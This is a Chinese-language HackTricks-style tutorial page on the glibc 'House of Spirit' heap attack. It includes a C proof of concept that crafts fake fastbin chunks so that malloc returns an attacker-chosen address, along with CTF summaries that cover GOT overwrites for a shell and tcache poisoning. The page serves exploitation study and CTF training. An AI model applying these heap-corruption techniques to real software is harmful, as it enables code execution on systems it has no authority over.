# House of Spirit

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

### 代码

<details>

<summary>House of Spirit</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### 目标

- 能够将一个地址添加到 tcache / fast bin，以便后续可以分配它

### 要求

- 该攻击要求攻击者能够创建几个假 fast chunks，正确指示其大小值，然后能够释放第一个假 chunk，使其进入 bin。

### 攻击

- 创建绕过安全检查的假 chunks：您基本上需要 2 个假 chunks，正确指示正确的大小
- 以某种方式管理释放第一个假 chunk，使其进入 fast 或 tcache bin，然后分配它以覆盖该地址

**来自** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **的代码非常适合理解该攻击。** 尽管该代码的示意图总结得很好：
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
> [!NOTE]
> 请注意，创建第二个块是绕过某些完整性检查的必要条件。

## 示例

- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)

- **Libc 信息泄露**：通过溢出，可以更改指针以指向 GOT 地址，从而通过 CTF 的读取操作泄露 libc 地址。
- **House of Spirit**：利用一个计数器来计算“步枪”的数量，可以生成第一个假块的假大小，然后利用“消息”可以伪造第二个块的大小，最后通过溢出可以更改一个即将被释放的指针，这样我们的第一个假块就被释放了。然后，我们可以分配它，里面将包含“消息”存储的地址。接着，可以使这个指针指向 GOT 表中的 `scanf` 入口，这样我们就可以用 system 的地址覆盖它。\
下次调用 `scanf` 时，我们可以发送输入 `"/bin/sh"` 并获得一个 shell。

- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
- **Glibc 泄露**：未初始化的栈缓冲区。
- **House of Spirit**：我们可以修改全局堆指针数组的第一个索引。通过单字节修改，我们在一个有效块内的假块上使用 `free`，这样在再次分配后我们就得到了重叠块的情况。通过这种方式，简单的 Tcache 中毒攻击可以实现任意写入原语。

## 参考

- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)

{{#include ../../banners/hacktricks-training.md}}
